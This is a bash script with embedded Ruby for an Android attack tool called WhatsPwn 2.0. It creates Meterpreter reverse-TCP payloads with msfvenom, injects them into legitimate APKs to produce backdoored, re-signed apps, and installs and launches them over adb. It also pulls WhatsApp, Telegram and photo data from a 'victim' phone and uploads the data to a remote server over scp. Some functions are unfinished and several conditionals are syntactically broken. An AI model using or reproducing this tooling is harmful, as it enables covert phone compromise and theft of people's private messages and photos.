#!/bin/bash

##############################################################################
# WhatsPwn 2.0 Copyright (C) 2016  José Luis Rodríguez Fragoso               #
#                                                                            #
#    This program is free software: you can redistribute it and/or modify    #
#    it under the terms of the GNU General Public License as published by    #
#    the Free Software Foundation, either version 3 of the License, or       #
#    (at your option) any later version.                                     #
#                                                                            #
#    This program is distributed in the hope that it will be useful,         #
#    but WITHOUT ANY WARRANTY; without even the implied warranty of          #
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
#    GNU General Public License for more details.                            #
#                                                                            #
#    You should have received a copy of the GNU General Public License       #
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                            #
#   José Luis Rodríguez Fragoso                                              #
#   jlrodriguezfragoso@gmail.com                                             #
##############################################################################

# COLOR MATCHING
NONE='\033[0m'
BOLD='\033[1m'
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
#######################################################################################################################
#                                                    SUBFUNCTIONS                                                     #
#######################################################################################################################
# CHECK IF AUTO MODE IS ENABLED, IF SO, PROMPT FOR ALL CONFIGURATION VARIABLES.
CHKAUTO() {
	if [[ ${AUTOMODE} == "1" ]]; then
		# IF THE OPTION CHOSEN BEFORE WAS JUST EXTRACTION
		if [[ ${MENU} -eq 5 ]] || [[ ${MENU} -eq 6]]; then
			NAME_PROMPT
			DCIM_PROMPT
			BACKUP_PROMPT
			UPLOAD_PROMPT
			case "UPLOADYN" in
				Y|y|yes|YES) SSHPASS_PROMPT ;;
			esac
		# IF IT WAS FULL
		else
			PAYLOAD_PROMPT
			BLACKHOLE_PROMPT
			NAME_PROMPT
			case "$BACKHOLE" in
				Y|y|yes|YES) DCIM_PROMPT ;;
			esac
			BACKUP_PROMPT
			UPLOAD_PROMPT
			case "UPLOADYN" in
				Y|y|yes|YES) SSHPASS_PROMPT ;;
			esac
		fi
	fi
}

# ERROR IN CONNECTION
FAIL_MSG(){
	echo -e "\n${RED}YOU ARE NOT CONNECTED${NONE}" && echo -n "\nPress any key to continue ..." && read -n 1
}
#######################################################################################################################
#                                                   MAIN FUNCTIONS                                                    #
#######################################################################################################################
#FULL ATTACK ### UNFINISHED
FULL_ATTACK() {
	if [[ -n $CONNECTED ]]; then
		# INSTALLS PAYLOAD
		if [[ -n $PAYLOAD ]]; then
			${WDIR}/bin/adb install ${PAYLOAD} && ${WDIR}/bin/adb shell am start ${USER} -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
		fi
		# INSTALL ANDROID LOCKSCREEN BYPASS

	else
		FAIL_MSG
	fi
}

# LAUNCH SHELL
SHELL() {
	if [[ -n $CONNECTED ]]; then
		${WDIR}/bin/adb shell && MAIN_INTERFACE
	else
		FAIL_MSG
	fi
}

# RESTORE WHATSAPP
RESTORE() {
	if [[ -n $CONNECTED ]]; then
		${WDIR}/bin/adb install -r -d ${WDIR}bin/WhatsApp_Backup.apk && MAIN_INTERFACE
	else
		FAIL_MSG
	fi
}

# EXTRACTION
EXTRACTION() {
	if [[ -z $CONNECTED ]]; then
		echo -e "${BOLD}EXTRACTING DATA ... ${GREEN}[OK]${NONE}"
		mkdir -p ${PATHEXT}extracted/${NAME}/WhatsApp
		${WDIR}/bin/adb pull "/sdcard/WhatsApp/Media" ${PATHEXT}extracted/${NAME}/WhatsApp
		${WDIR}/bin/adb pull "/sdcard/Android/data/com.whatsapp/files" ${PATHEXT}extracted/${NAME}/WhatsApp
		mkdir -p ${PATHEXT}extracted/${NAME}/Telegram
		${WDIR}/bin/adb pull "/sdcard/Telegram/Telegram Images" ${PATHEXT}extracted/${NAME}/Telegram
		${WDIR}/bin/adb pull "/sdcard/Android/data/org.telegram.messenger/cache" ${PATHEXT}extracted/${NAME}/Telegram
		mkdir -p ${PATHEXT/}extracted/${NAME}/Pictures
		${WDIR}/bin/adb pull "/sdcard/Pictures" ${PATHEXT}extracted/${NAME}/Pictures
		case "$DCIM" in
			Y|y|yes|YES) echo -e "${BOLD}EXTRACTING DCIM PHOTOS ... ${GREEN}[OK]${NONE}"
							mkdir -p ${PATHEXT}extracted/${NAME}/DCIM
							${WDIR}/bin/adb pull "/sdcard/DCIM" ${PATHEXT}extracted/${NAME}/DCIM
							WHATSUSED ;;
			N|n|no|NO) echo -e "${BOLD}SKIPPING DCIM PHOTOS ... ${GREEN}[OK]${NONE}" && WHATSUSED ;;
			*) echo -e "${RED}YOUR ANSWER IS NOT VALID${NONE}...TAKING IT AS A YES"
				echo -e "${BOLD}EXTRACTING DCIM PHOTOS ... ${GREEN}[OK]${NONE}"
				mkdir -p ${PATHEXT}extracted/${NAME}/DCIM
				${WDIR}/bin/adb pull "/sdcard/DCIM" ${PATHEXT}extracted/${NAME}/DCIM
				WHATSUSED ;;
		esac
	else
		FAIL_MSG
	fi

}

# UPLOAD FILES
UPLOAD() {
	if [[ ! -d ${PATHEXT}extracted ]]; then
		if [[ ! -f ${PATHEXT}${BACKUPZIPNAME}.zip ]]; then
			echo -e "${RED}THERE ARE NO EXTRACTED FILES OR FOLDERS${NONE}"
		else
			echo -e "${BOLD}ONLY BACKUP COMPRESSED FILE FOUND${NONE}"
			CMND
			sshpass -p ${SSHPASS} scp -c blowfish ${PATHEXT}${BACKUPZIPNAME}.zip ${USRSERV}@${SERV}:${OUTPUTDIRSERV} &
			echo -e "${BOLD}SENDING (IN BACKGROUND) ... ${GREEN}[OK]${NONE}"
		fi
	else
		if [[ ! -f ${PATHEXT}${BACKUPZIPNAME}.zip ]]; then
			echo -e "${BOLD}ONLY EXTRACTED FOLDER FOUND"
			CMND
			sshpass -p ${SSHPASS} scp -cr blowfish ${PATHEXT}extracted/ ${USRSERV}@${SERV}:${OUTPUTDIRSERV} &
			echo -e "${BOLD}SENDING (IN BACKGROUND) ... ${GREEN}[OK]${NONE}"
		else
			echo -e "${BOLD}BOTH BACKUP FILE AND EXTRACTED FOLDER FOUND...UPLOADING ZIP"
			CMND
			sshpass -p ${SSHPASS} scp -c blowfish ${PATHEXT}${BACKUPZIPNAME}.zip ${USRSERV}@${SERV}:${OUTPUTDIRSERV} &
			echo -e "${BOLD}SENDING (IN BACKGROUND) ... ${GREEN}[OK]${NONE}"
		fi
	fi
	if [[ $USEINTERFACE == "Y" ]]; then
			MAIN_INTERFACE
		else
			exit 0
	fi
}

# INJECT METERPRETER INTO LEGITIMATE APK
INJECTION(){
	/usr/bin/env ruby <<-EORUBY
require 'nokogiri'
require 'fileutils'
require 'optparse'

# FIND ACTIVITY
def FIND_ACTIVITY(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity|//activity-alias")
    for activity in activities 
        activityname = activity.attribute("name")
        category = activity.search('category')
        unless category
            next
        end
        for cat in category
            categoryname = cat.attribute('name')
            if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                activityname = activityname.to_s
                unless activityname.start_with?(package)
                    activityname = package + activityname
                end
                return activityname
            end
        end
    end
end

def RECURSE_SEARCH()
	smali_files||=[]
	Dir.glob('Legitimate/smali*/**/*.smali') do |file|
	  checkFile=File.read(file)
	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
		smali_files << file
		smalifile = file
		activitysmali = checkFile
	  end
	end
	i=0
	print "[*] Please choose from one of the following:\n"
	smali_files.each{|s_file|
		print "[+] Hook point ",i,": ",s_file,"\n"
		i+=1
	}
	hook=-1
	while (hook < 0 || hook>i)
		print "\nHook: "
		hook = STDIN.gets.chomp.to_i
	end
	i=0
	smalifile=""
	activitysmali=""
	smali_files.each{|s_file|
		if (i==hook)
			checkFile=File.read(s_file)
			smalifile=s_file
			activitysmali = checkFile
			break
		end
		i+=1
	}
	return [smalifile,activitysmali]
end

def IMPORT_PERMISSIONS()
	payload_permissions=[]
	
	#Load payload's permissions
	File.open("payload/AndroidManifest.xml","r"){|file|
		k=File.read(file)
		payload_manifest=Nokogiri::XML(k)
		permissions = payload_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			payload_permissions << name.to_s
		end
	#	print "#{k}"
	}
	Legitimate_permissions=[]
	apk_mani=''
	
	#Load Legitimate apk's permissions
	File.open("Legitimate/AndroidManifest.xml","r"){|file2|
		k=File.read(file2)
		apk_mani=k
		Legitimate_manifest=Nokogiri::XML(k)
		permissions = Legitimate_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			Legitimate_permissions << name.to_s
		end
	#	print "#{k}"
	}
	#Get permissions that are not in Legitimate APK
	add_permissions=[]
	for permission in payload_permissions
		if !(Legitimate_permissions.include? permission)
			print "[*] Adding #{permission}\n"
			add_permissions << permission
		end
	end
	inject=0
	new_mani=""
	#Inject permissions in Legitimate APK's manifest
	for line in apk_mani.split("\n")
		if (line.include? "uses-permission" and inject==0)
			for permission in add_permissions
				new_mani << '<uses-permission android:name="'+permission+'"/>'+"\n"
			end
			new_mani << line+"\n"
			inject=1
		else
			new_mani << line+"\n"
		end
	end
	File.open("Legitimate/AndroidManifest.xml", "w") {|file| file.puts new_mani }
end
LEGITIMATE_APK = "$LEGITIMATE_APK"
print "[*] DECOMPILING ORIGNAL APK ...\n"
`apktool d $LEGITIMATE_APK -o $WDIR/tmp/Legitimate`
print "[*] DECOMPILING PAYLOAD APK ...\n"
`apktool d $PAYLOAD -o $WDIR/tmp/$PAYLOAD_NAME`

f = File.open("Legitimate/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close

print "[*] LOCATING onCreate() HOOK ...\n"


launcheractivity = FIND_ACTIVITY(amanifest)
smalifile = 'Legitimate/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
begin
	activitysmali = File.read(smalifile)
rescue Errno::ENOENT
	print "[!] UNABLE TO FIND CORRECT HOOK AUTOMATICALLY.\n"
	begin
		results=RECURSE_SEARCH()
		smalifile=results[0]
		activitysmali=results[1]
	rescue
		puts "[-] ERROR FINDING LAUNCHER ACTIVITY."
		PAYLOAD_INT
	end
end

print "[*] COPYING PAYLOAD FILES ...\n"
FileUtils.mkdir_p('Legitimate/smali/com/metasploit/stage/')
FileUtils.cp Dir.glob('$WDIR/tmp/$PAYLOAD_NAME/smali/com/metasploit/stage/Payload*.smali'), 'Legitimate/smali/com/metasploit/stage/'
activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
print "[*] LOADING ",smalifile," AND INJECTING PAYLOAD ...\n"
File.open(smalifile, "w") {|file| file.puts hookedsmali }
injected_apk=LEGITIMATE_APK.split(".")[0]
injected_apk+="_backdoored.apk"

print "[*] POISONING THE MANIFEST WITH METERPRETER PERMISSIONS ...\n"
IMPORT_PERMISSIONS()

print "[*] REBUILDING #{LEGITIMATE_APK} WITH METERPRETER INJECTION AS #{injected_apk} ...\n"
`apktool b -o $WDIR/bin/Payloads/#{injected_apk} $WDIR/tmp/Legitimate`
print "[*] SIGNING #{injected_apk} ...\n"
`mkdir $WDIR/bin/Payloads/Signed/`
`java -jar $WDIR/bin/signapk.jar testkey.pk8 testkey.x509.pem $WDIR/bin/Payloads/#{injected_apk} $WDIR/bin/Payloads/Signed/#{injected_apk}`

puts "[+] INFECTED FILE $WDIR/bin/Payloads/Signed/#{injected_apk} READY.\n"
EORUBY
}

#HIDDEN


# VISIBLE
VISIBLE() {
	echo -e -n "\n\n${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO [${SERV}]: ${NONE}"
	read PAYLOAD_IP
	echo -e -n "\n\n${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT [${PAYLOAD_PORT}]: ${NONE}"
	read PAYLOAD_PORT
	echo -e -n "\n\n${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD WITHOUT .APK [${PAYLOAD_NAME}]: ${NONE}"
	read PAYLOAD_NAME
	echo -e "${BOLD}CREATING PAYLOAD ... ${GREEN}[OK]${NONE}"
	msfvenom -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_IP} LPORT=${PAYLOAD_PORT} R > ${WDIR}/bin/Payloads/${PAYLOAD_NAME}.apk
	PAYLOAD="${WDIR}/bin/Payloads/${PAYLOAD_NAME}.apk"
	echo -e "\n${GREEN}PAYLOAD CREATED SUCCESSFULLY ${NONE}[${CYAN}${PAYLOAD}${NONE}]"
}

# RELAUNCH OR INSTALL PAYLOAD INTO DEVICE
RELAUNCH() {
	INSTALL(){
		if [[ -z CONNECTED ]]; then
			echo -e "${BOLD}INSTALLING PAYLOAD APK ... ${GREEN}[OK]${NONE}"
			${WDIR}/bin/adb install ${PAYLOAD}
			echo -e "${BOLD}INITIALIZING PAYLOAD APK ... ${GREEN}[OK]${NONE}"
			${WDIR}/bin/adb shell am start ${USER} -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
		fi
	}
	if [[ -z $PAYLOAD ]]; then
		if [ find ${WDIR}/bin/Payloads/Signed -prune -empty ];then
			echo -e -n "COULD NOT FIND ANY PAYLOAD, CREATE ONE NOW? [Y/N]: "
			read CREATE_PAYLOAD
			case "$CREATE_PAYLOAD" in
				 y|Y|YES|yes) echo -e -n "HIDDEN OR VISIBLE? [H/V]: " && read HV
				case "$HV" in
					H|h) HIDDEN && INSTALL ;;
					v|V) VISIBLE && INSTALL ;;
				esac ;;
				N|n|NO|no) PAYLOAD_INT ;;
			esac
		else
			NUM_PAYLOADS=$(find ${WDIR}/bin/Payloads/Signed/ -mindepth 1 -type f -name "*.apk" -exec printf x \; | wc -c)
			echo -e "${BOLD}FOUND THIS ${NUM_PAYLOADS} SIGNED PAYLOADS ...${NONE}"
			ls ${WDIR}/bin/Payloads/Signed/*.apk
			echo -e -n "\nENTER THE NAME OF THE ONE YOU WANT TO USE: "
			read $PAYLOAD_NAME
			PAYLOAD=${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}
			INSTALL
		fi
	else
		INSTALL
	fi
}
#######################################################################################################################
#                                                     INTERFACES                                                      #
#######################################################################################################################
# PAYLOAD INTERFACE
PAYLOAD_INT() {
	if [[ -d ${WDIR}/bin/Payloads/Signed/ ]]; then
		continue
	else
		mkdir -p ${WDIR}/bin/Payloads/Signed/
	fi
	clear
	cat ${WDIR}/bin/motd
	echo -e "\n                                                 DEVICE STATUS: ${STATUS}"
	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?${CYAN}\n
	1) INJECT METERPRETER PAYLOAD INTO LEGITIMATE APK
	2) CREATE HIDDEN METERPRETER PAYLOAD [NOT VISIBLE IN DRAWER]
	3) CREATE A VISIBLE METERPRETER PAYLOAD [VISIBLE METASPLOIT ICON]
	4) INSTALL OR RELAUNCH PAYLOAD IN DEVICE
	99) RETURN TO MAIN MENU
	x) EXIT${NONE}"
	echo -e -n "\n${CYAN}WAP${NONE}>"
	read MENU
	case "$MENU" in
		1) INJECTION ;;
		2) HIDDEN ;;
		3) VISIBLE ;;
		4) RELAUNCH ;;
		99) MAIN_INTERFACE ;;
		x|X) exit 0 ;;
		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && PAYLOAD_INT ;;
	esac
}
#######################################################################################################################
# MAIN INTERFACE IF -i OPTION PASSED THROUGH
MAIN_INTERFACE() {
	clear
	# LICENSE AGREEMENT PROMPT
	while true; do
		if grep "I accept" .LicenseAgreed; then
			break
		else
			clear
			cat << EOF > LicenseAgreement
WhatsPwn  Copyright (C) 2016  José Luis Rodríguez Fragoso
This program comes with ABSOLUTELY NO WARRANTY; for details type 'w'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'c' for details.
EOF
			# DISPLAY LICENSE AGREEMENT PROMPT
			cat LicenseAgreement
			echo -e -n "\n${BOLD}Do you accept the rights? ${NONE}${BOLD}[Y/N/W/C]: ${NONE}"
			read license
		        case "$license" in
		        	# OPTIONS AND ARGUMENTS FOR LICENSE
		        	Y|y|yes|YES|Yes|yES|yeS|YEs|YeS) cat << EOF > .LicenseAgreed
I accept
EOF
					break ;;
		        	N|n|NO|no|No|nO) echo "I do NOT accept" > .LicenseAgreed && exit ;;
					# WARRANTY W OPTION
		        	W|w) echo -e "\n" && cat << EOF > LicenseAgreement
THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.
EOF
					cat LicenseAgreement && echo -e -n "\nPress any key to continue ..." && read -n 1;;
				# FULL LICENSE C OPTION [CONDITIONS]
				C|c) cat LICENSE | less && echo -e -n "\nPress any key to continue ..." && read -n 1;;
				esac
		fi
	done
# END OF LICENSE AGREEMENT PROMPT

# INTERFACE INIT
	clear
	cat ${WDIR}/bin/motd
	echo -e "\n                                                 DEVICE STATUS: ${STATUS}"
	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?${CYAN}\n
	1) START FULL ATTACK
	2) LAUNCH SHELL
	3) EMERGENCY RESTORE WHATSAPP (IN CASE OF ERROR)
	4) JUST RUN EXTRACTION (REMOTE)
	5) UPLOAD FILES TO SERVER
	6) PAYLOAD
	x) EXIT${NONE}"
	echo -e -n "\n${CYAN}WAP${NONE}>"
	read MENU
	case "$MENU" in
		1) CHKAUTO && FULL_ATTACK ;;
		2) SHELL && MAIN_INTERFACE ;;
		3) RESTORE ;;
		4) CHKAUTO && EXTRACTION ;;
		5) UPLOAD ;;
		6) PAYLOAD_INT ;;
		x|X) exit 0 ;;
		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && MAIN_INTERFACE ;;
	esac
}
#######################################################################################################################
#                                                 MAIN CONFIGURATION                                                  #
#######################################################################################################################
# ENABLE CLEANLY EXIT WITH CTRL+C ######## UNFINISHED
clear

# DETERMINE IF USER IS ROOT
if [ "`id -u`" -eq 0 ]; then
	id=root
else
	echo -e "\n${RED}YOU NEED TO BE ROOT.${NONE}"
fi

# DETERMINE DIRECTORY OF THIS SCRIPT.
WDIR="`dirname \"$0\"`"          # RELATIVE PATH
WDIR=$(cd ${WDIR} && pwd)  # ABSOLUTE AND NORMALIZED PATH
# IF ERROR [VARIABLE NOT SET] RETURN ERROR
if [ -z "$WDIR" ] ; then
	echo -e "\n${RED}CANNOT DETERMINE SCRIPT DIRECTORY.${NONE}"
	exit 1
fi

# INSTALL DEPENDENCIES
# INSTALL JAVA 7 FOR apktool
# IF JAVA VERSION IS NOT 7 INSTALLS IT
if [ ! java -version 2>1& | awk -F\" '/version/ {print$2}' | grep "1.7" -oE ]; then
	# INSTALLS JAVA 7 AND UPDATE ALTERNATIVES FOR DUPLICATE CANDIDATES
	apt-get install openjdk-7-jdk && update-alternatives --config java
	# FOLLOW SYMLINKS TO ACTUAL JAVA BINARY AND SET PATH VARIABLE
	JAVA_PATH=$(readlink -f `which java` | rev | cut -b 5- | rev)
	# SET JAVA_HOME ENVIRONMENTAL VARIABLE
	echo "JAVA_HOME=${JAVA_PATH}" >> /etc/environment
	# RELOAD ENVIRONMENTAL VARIABLES
	source /etc/environment
fi

# apktool FOR INJECTION AND HIDDEN
if [[ ! apktool -version | grep "2." ]]; then
	# DOWNLOAD WRAPPER
	wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/bin/apktool
	# DOWNLOAD MAIN JAR
	wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.1.0.jar -O /usr/bin/apktool.jar
	# ALLOW EXECUTION
	chmod +x /usr/bin/apktool /usr/bin/apktool.jar
	# INSTALL COMPATIBILITY WITH 32 BITS MACHINE
	apt-get install lib32stdc++6 lib32ncurses5 lib32z1
fi

# METASPLOIT FRAMEWORK FOR PAYLOAD CREATION AND HANDLER
if [ ! which msfvenom ]; then
	if [[ ! uname -a | grep "kali" ]]; then
		apt-get install metasploit-framework
	else
		echo -e "${RED}METASPLOIT FRAMEWORK NOT INSTALLED AND YOUR LINUX DISTRO IS NOT KALI, INSTALL IT IF WANT TO USE THE PAYLOAD GENERATOR FEATURES.${NONE}"
	fi
fi

# SSHPASS
if [[ ! type sshpass ]] > /dev/null; then
	echo -e "${BOLD}${RED}SSHPASS NOT FOUND, ${NONE}INSTALLING IT ... ${GREEN}[OK]${NONE}"
	apt-get install sshpass -y
fi

# LOAD CONFIG FILES
. ${WDIR}/config
. ${WDIR}/server

# CREATE TEMPORARY DIRECTORY 
mkdir ${WDIR}/tmp/ > /dev/null

# ATTEMPT CONNECTION TO DEVICE IN BACKGROUND
while true; do
	# CHECK IF DEVICE IS NOT CONNECTED AND WAITS FOR IT
	if [[ ! -f ${WDIR}/tmp/ADB_Devices ]]; then
			echo -e "${BOLD}CONNECT THE DEVICE${NONE}"
			${WDIR}/bin/adb wait-for-device > /dev/null
	fi
	# EXPORT RESULT OF 'adb devices' COMMAND TO A FILE
	${WDIR}/bin/adb devices > ${WDIR}/tmp/ADB_Devices
	# IF THE FILE CONTAINS AN IP, SET IT AS VARIABLE	
	IP=$(grep -oE "[0-9]{1,3}(\.[0-9]{1,3}){3}" ${WDIR}/tmp/ADB_Devices)
	# IF IP VARIABLE IS SET THEN IT IS CONNECTED WIRELESSLY
	if [[ -n "$IP" ]]; then
		CONNECTED=1
		STATUS="${GREEN}CONNECTED${NONE} IP = [${CYAN}${IP}${NONE} IF YOU HAVE YOUR DEVICE CONNECTED TO CABLE, DISCONNECT IT.]"
		# REMOVE ADB _Devices FILE TO AVOID ENTERING ABOVE IF STATEMENT
		rm -f ${WDIR}/tmp/ADB_Devices
		# BREAK THE CYLCE
		break
	else
		# IF IP IS NOT SET, CHECK IF DEVICES IS CONNECTED LOCALLY ONLY
		if [ grep -oE "device" ${WDIR}/tmp/ADB_Devices ]; then
			# GET DEVICE IP WHILE ITS STILL CONNECTED
			DEVICE_IP=$(${WDIR}/bin/adb shell ip -f inet addr show wlan0 | grep "inet [0-9]{1,3}(\.[0-9]{1,3}){3}" -oE | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE)
			# ATTEMPT TO CONNECT WIRELESSLY
			${WDIR}/bin/adb tcpip 5555
			# ATTEMPT WIRELESS CONNECTION IF NOT CONNECTED
			if  ! ${WDIR}/bin/adb connect ${DEVICE_IP}:5555 | grep "connected to ${DEVICE_IP}" -oE; then
				# IF NOT CHECK IF IT IS STILL CONNECTED TO USB
				if ${WDIR}/bin/adb devices | grep "device" -oE; then
					# IF IT IS, DISPLAY CONNECTED LOCALLY
					CONNECTED=1
					STATUS="${GREEN}CONNECTED ${CYAN}LOCALLY"
					# REMOVE ADB DEVICES FILE
					rm -f ${WDIR}/tmp/ADB_Devices
					# BREAK THE CYCLE
					break
				else
					# IF IT IS NOT CONNECTED TO USB SET DISCONNECTED, REMOVE ADB FILE AND CLEAR VARIABLE BUT DO NOT BREAK CYCLE TO KEEP ATTEMPTING CONNECTING
					unset CONNECTED
					STATUS="${RED}DISCONNECTED${NONE}"
					rm -f ${WDIR}/tmp/ADB_Devices
				fi
			fi
		fi
	fi
done
#######################################################################################################################
#                                                  ARGUMENT PARSER                                                    #
#######################################################################################################################
if [[ $# > 0 ]]; then
	option="$1"
	case "$option" in
		# FULL ATTACK
		--full|-f|1) if [[ $# > 1 ]]; then
						shift
						while [[ $# > 0 ]]; do
							option="$1"
							case "$option" in
								# SUBOPTIONS FOR FULL ATTACK
								-p|--payload) PAYLOAD="Y" && shift ;;
								-e|--extraction) BLACKHOLE="Y" && shift ;;
								-v|--victim) NAME="$2" && shift 2 ;;
								-d|--dcim) DCIM="Y" && shift ;;
								-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
								-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
								-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
								-o|--output) PATH="$2" && shift 2 ;;
								*) cat ${WDIR}/bin/USAGE && break ;;
							esac
						done
					fi && WHATSPWNREMOTE ;;
		# RELAUNCH PAYLOAD
		--relaunch-payload|-r|2) BD2 && cd ${HOME} ;;
		# LAUNCH REMOTE SHELL IF POSSIBLE, IF NOT LAUNCH LOCAL SHELL
		--shell|-s|3) SHELL && cd ${HOME} ;;
		# RESTORE WHATSAPP IN CASE OF ERROR
		--restore|-w|4) bin/adb wait-for-device && bin/adb install -r -d bin/WhatsApp_Backup.apk && cd ${HOME} ;;
		# EXTRACT SENSITIVE DATA ONLY [NOT WHATSAPP DATABASE]
		--extraction|-x|5) if [[ $2 == "local" ]]; then # EXTRACTION SUBOPTIONS
									# LOCAL EXTRACTION
									if [[ $# > 2 ]]; then
										shift 2
										while [[ $# > 0 ]]; do
											option="$1"
											case "$option" in
												-v|--victim) NAME="$2" && shift 2 ;;
												-d|--dcim) DCIM="Y" && shift ;;
												-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
												-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
												-o|--output) PATH="$2" && shift 2 ;;
												*) cat ${WDIR}/bin/USAGE && break ;;
											esac
										done
										BHL
									else
										BHL
									fi
								 fi 
								 # REMOTE EXTRACTION
								 if [[ $2 == "remote" ]]; then
								 	if [[ $# > 2 ]]; then
										shift 2
										while [[ $# > 0 ]]; do
											option="$1"
											case "$option" in
												-v|--victim) NAME="$2" && shift ;;
												-d|--dcim) DCIM="Y" && shift ;;
												-k|--backup) BACKUPZIPNAME="$2" && shift ;;
												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
												-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
												-o|--output) PATH="$2" && shift ;;
												*) cat ${WDIR}/bin/USAGE && break ;;
											esac
										done
										BHRMANUAL
									else
										BHRMANUAL
									fi
								 fi && cat ${WDIR}/bin/USAGE ;;
		# UPLOAD EXTRACTED FILES TO SERVER
		--upload|-u|6) UPLOAD ;;
		# LAUNCH CLI INTERFACE
		-i|--interface|8) USEINTERFACE="Y" && MAIN_INTERFACE && break ;;
		-v|--version) echo "WhatsPwn 2.0" && exit 0
		# ANY OTHER OPTION
		*) cat ${WDIR}/bin/USAGE ;;
	esac
else
	# IF NO OPTIONS GIVEN
	cat ${WDIR}/bin/USAGE
fi
# EXIT WITHOUT ERRORS
exit 0
#######################################################################################################################
